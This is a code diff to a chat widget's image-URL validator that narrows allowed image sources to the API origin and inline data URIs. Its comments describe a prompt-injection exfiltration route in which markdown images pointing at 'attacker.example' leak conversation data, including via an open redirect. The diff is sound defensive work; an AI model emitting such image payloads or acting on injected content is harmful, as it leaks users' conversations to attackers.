@@ -75,9 +75,12 @@ const RASTER_DATA_URI = /^data:image\/(png|jpe?g|gif|webp);base64,/i;
  * chunk or tool result). The browser loads an <img> by itself, so
  * `![](https://attacker.example/?leak=...)` would send conversation data to
  * the attacker with no click. Images may therefore only load from:
- *   - the page the widget runs on (same origin),
  *   - the widget API origin (knowledge-base images are served from there),
  *   - inline raster data: URIs.
+ * Not the page the widget runs on: an open redirect there
+ * (`/out?to=https://attacker.example/?leak=…`) would forward the request, and
+ * the image would fire authenticated GETs against the host site. When the
+ * widget runs on the API's own origin, those images are allowed as API images.
  * @param src - the image URL as written in the markdown
  */
 export function isAllowedImageSrc(src: unknown): boolean {
@@ -93,7 +96,7 @@ export function isAllowedImageSrc(src: unknown): boolean {
   }
   if (url.protocol !== 'https:' && url.protocol !== 'http:') return false;
 
-  return url.origin === window.location.origin || url.origin === getApiOrigin();
+  return url.origin === getApiOrigin();
 }
 
 // Reverse escapeHtml() for the few entities it produces, so a URL captured
